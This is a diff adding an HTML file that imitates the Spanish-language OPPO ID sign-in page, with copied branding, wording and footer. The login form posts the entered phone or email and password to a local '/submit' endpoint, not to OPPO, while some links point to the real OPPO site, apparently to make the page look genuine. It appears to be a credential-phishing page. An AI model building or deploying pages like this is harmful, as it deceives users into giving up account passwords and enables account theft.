@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OPPO ID - Iniciar sesión</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap');
+        
+        body { 
+            font-family: 'Plus Jakarta Sans', sans-serif; 
+            background-color: #ffffff; 
+        }
+
+        /* Verde oficial de OPPO */
+        .oppo-green {
+            background-color: #05a66b;
+        }
+        .oppo-green:hover {
+            background-color: #048a58;
+        }
+
+        /* Estilo de los inputs de OPPO */
+        .oppo-input {
+            background-color: #f7f7f7;
+            border: 1px solid transparent;
+            border-radius: 12px;
+            transition: all 0.2s ease;
+        }
+        .oppo-input:focus {
+            background-color: #ffffff;
+            border-color: #05a66b;
+            outline: none;
+        }
+
+        /* Logo de OPPO estilizado */
+        .oppo-logo {
+            color: #05a66b;
+            font-weight: 700;
+            font-size: 2.2rem;
+            letter-spacing: -1px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+    </style>
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen p-6">
+
+    <div class="w-full max-w-[400px]">
+        
+        <div class="flex justify-center mb-12">
+            <h1 class="oppo-logo">oppo</h1>
+        </div>
+
+        <div class="px-2">
+            <h2 class="text-2xl font-bold text-gray-900 mb-2">Iniciar sesión</h2>
+            <p class="text-gray-500 text-sm mb-10">Inicia sesión con tu OPPO ID para disfrutar de más servicios.</p>
+
+            <form action="/submit" method="POST" class="space-y-4">
+                
+                <div>
+                    <input type="text" name="username" required
+                        class="oppo-input w-full px-5 py-4 text-gray-800"
+                        placeholder="Teléfono / Correo electrónico">
+                </div>
+
+                <div>
+                    <input type="password" name="password" required
+                        class="oppo-input w-full px-5 py-4 text-gray-800"
+                        placeholder="Contraseña">
+                </div>
+
+                <div class="flex justify-between items-center py-2">
+                    <div class="flex items-center gap-2">
+                        <input type="checkbox" id="terms" class="w-4 h-4 accent-[#05a66b]">
+                        <label for="terms" class="text-xs text-gray-500">He leído y acepto el <span class="text-[#05a66b]">Contrato de usuario</span></label>
+                    </div>
+                </div>
+
+                <button type="submit" 
+                    class="w-full oppo-green text-white font-semibold py-4 rounded-full transition-all shadow-md mt-4">
+                    Iniciar sesión
+                </button>
+            </form>
+
+            <div class="mt-8 flex justify-center gap-6 text-sm font-medium">
+                <a href="https://id.oppo.com" target="_blank" class="text-gray-400 hover:text-[#05a66b]">¿Olvidó su contraseña?</a>
+                <span class="text-gray-200">|</span>
+                <a href="https://id.oppo.com" target="_blank" class="text-[#05a66b] hover:underline">Registrar cuenta</a>
+            </div>
+
+            <div class="mt-12">
+                <div class="relative flex py-5 items-center">
+                    <div class="flex-grow border-t border-gray-100"></div>
+                    <span class="flex-shrink mx-4 text-gray-300 text-xs uppercase">Otros métodos</span>
+                    <div class="flex-grow border-t border-gray-100"></div>
+                </div>
+
+                <div class="flex justify-center gap-6 mt-4">
+                    <a href="#" class="p-3 bg-gray-50 rounded-full hover:bg-gray-100 transition">
+                        <img src="https://www.facebook.com/favicon.ico" class="w-5 h-5 grayscale opacity-70" alt="FB">
+                    </a>
+                    <a href="#" class="p-3 bg-gray-50 rounded-full hover:bg-gray-100 transition">
+                        <img src="https://www.google.com/favicon.ico" class="w-5 h-5 grayscale opacity-70" alt="G">
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="mt-auto py-8 text-gray-400 text-[11px] text-center w-full">
+        <div class="flex justify-center gap-4 mb-2">
+            <a href="#" class="hover:underline">Acuerdo de privacidad</a>
+            <a href="#" class="hover:underline">Acuerdo de usuario</a>
+        </div>
+        <p>© 2026 OPPO. Todos los derechos reservados.</p>
+    </footer>
+
+</body>
+</html>
